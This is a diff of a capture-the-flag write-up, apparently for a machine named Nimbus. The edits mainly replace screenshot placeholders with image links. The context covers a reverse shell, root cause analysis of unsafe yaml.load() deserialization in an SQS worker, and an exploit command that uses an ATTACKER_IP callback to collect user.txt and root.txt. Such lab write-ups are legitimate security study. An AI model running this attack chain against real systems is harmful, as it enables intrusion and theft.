@@ -142,7 +142,7 @@ At this stage the initial foothold on the machine had been successfully establis
 
 ## Process Enumeration
 
-Although the automation successfully compromised the machine, I continued enumerating the worker container to better understand the application's architecture and validate the assumptions made during exploitation.
+Continue enumerating the worker container to better understand the application's architecture and validate the assumptions made during exploitation.
 
 Listing the running processes showed the services executing inside the container.
 
@@ -158,7 +158,7 @@ python3 -u worker.py
 
 This indicated that a dedicated Python worker continuously processed queued jobs. The remaining `python3 -c...` processes corresponded to the reverse shell established during exploitation, confirming that the payload had been executed by the worker service rather than another component of the application.
 
-> **Insert screenshot:** Process list
+![Process List](images/Image4.png)
 
 ## Application Enumeration
 
@@ -178,7 +178,7 @@ Only two files were present:
 
 Since the entire application logic appeared to reside within a single Python script, reviewing its source code became the natural next step in understanding how jobs were processed and ultimately why remote code execution was possible.
 
-> **Insert screenshot:** `/app` directory
+![App Directory](images/Image5.png)
 
 ## Source Code Review
 
@@ -202,7 +202,7 @@ python3 -c
 
 Using `yaml.load()` with untrusted input performs unsafe object deserialization, allowing arbitrary Python objects to be instantiated during parsing. This design flaw explains why the malicious YAML payload successfully achieved arbitrary code execution and confirms the root cause of the compromise.
 
-> **Insert screenshot:** Vulnerable code
+![Vulnerable Code](images/Image6.png)
 
 To better understand the application's runtime behaviour, I manually executed the worker process and observed how it handled queued messages.
 
@@ -214,7 +214,7 @@ The worker immediately began polling the `nimbus-jobs` queue.
 
 This confirmed that the worker continuously trusted and executed user-controlled job definitions retrieved from the SQS queue. Together with the unsafe use of `yaml.load()`, this behaviour fully explained why arbitrary Python code could be executed simply by submitting a crafted YAML document.
 
-> **Insert screenshot:** Worker processing queue
+![Worker Proccessing Queue](images/7.png)
 
 ## Privilege Escalation
 
@@ -237,4 +237,4 @@ python3 nimbus_exploit.py <ATTACKER_IP> --port <LOCAL_PORT> --target <TARGET_IP>
 
 Within a few seconds, the worker processed the queued payload, the privileged build completed successfully, and the callback listener received the contents of both `user.txt` and `root.txt`, demonstrating a fully automated compromise from initial SSRF to root access.
 
-> **Insert screenshot:** Successful exploit output
+![Exploit Output](images/Image8.png)
